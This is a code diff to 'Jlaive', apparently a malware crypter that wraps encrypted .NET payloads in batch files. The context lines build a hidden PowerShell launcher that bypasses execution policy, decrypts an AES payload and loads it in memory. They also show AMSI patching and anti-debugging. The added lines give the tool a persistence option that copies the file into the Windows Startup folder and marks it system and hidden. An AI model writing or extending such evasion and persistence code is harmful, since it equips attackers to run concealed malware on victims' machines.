@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Text;
 
 using static Jlaive.Utils;
@@ -19,7 +20,7 @@ namespace Jlaive
             return $"%~n0.bat.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), [System.Convert]::FromBase64String('{Convert.ToBase64String(key)}'), [System.Convert]::FromBase64String('{Convert.ToBase64String(iv)}')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
         }
 
-        public static string CreateCS(byte[] key, byte[] iv, bool bamsi, bool antidebug, Random rng)
+        public static string CreateCS(byte[] key, byte[] iv, bool bamsi, bool antidebug, bool startup, Random rng)
         {
             string namespacename = RandomString(10, rng);
             string classname = RandomString(10, rng);
@@ -85,10 +86,23 @@ if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(
             Marshal.Copy(patch, 0, asbaddr, patch.Length);
             VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"
 
+            " + (startup ?
+            @"string filepath = Path.ChangeExtension(Process.GetCurrentProcess().MainModule.FileName, null);
+            string filecontent = File.ReadAllText(filepath);
+            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + ""\\"" + Path.GetFileName(filepath);
+            if (File.Exists(startuppath))
+            {
+                File.SetAttributes(startuppath, FileAttributes.Normal);
+                File.Delete(startuppath);
+            }
+            File.WriteAllText(startuppath, filecontent);
+            File.SetAttributes(startuppath, FileAttributes.System | FileAttributes.Hidden);" : string.Empty) + @"
+
             Assembly asm = Assembly.GetExecutingAssembly();
             StreamReader reader = new StreamReader(asm.GetManifestResourceStream(""payload.txt""));
             string payload = reader.ReadToEnd();
             reader.Dispose();
+
             MethodInfo entry = Assembly.Load(" + uncompressfunction + @"(" + aesfunction + @"(Convert.FromBase64String(payload), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @""")))).EntryPoint;
             try { entry.Invoke(null, new object[] { args[0].Split(' ') }); }
             catch { entry.Invoke(null, null); }
